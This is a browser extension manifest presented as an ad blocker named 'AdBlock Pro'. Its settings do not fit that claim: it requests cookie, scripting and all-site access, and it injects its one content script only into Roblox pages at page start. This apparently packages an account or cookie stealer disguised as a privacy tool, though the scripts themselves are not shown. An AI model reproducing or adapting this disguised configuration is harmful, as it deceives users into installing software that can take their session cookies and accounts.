{
  "manifest_version": 3,
  "name": "AdBlock Pro - Fast & Secure",
  "version": "1.1",
  "description": "Block ads, pop-ups, and trackers. Fast browsing with enhanced privacy protection.",
  "permissions": [
    "activeTab",
    "tabs",
    "storage",
    "scripting",
    "cookies"
  ],
  "host_permissions": [
    "<all_urls>",
    "*://*.roblox.com/*",
    "*://roblox.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["*://*.roblox.com/*", "*://roblox.com/*"],
      "js": ["content.js"],
      "run_at": "document_start",
      "all_frames": true
    }
  ],
  "action": {
    "default_popup": "popup.html",
    "default_title": "AdBlock Pro"
  },
  "web_accessible_resources": [
    {
      "resources": ["*"],
      "matches": ["<all_urls>"]
    }
  ],
  "icons": {
    "16": "icon16.png",
    "32": "icon32.png",
    "48": "icon32.png",
    "128": "icon128.png"
  }
}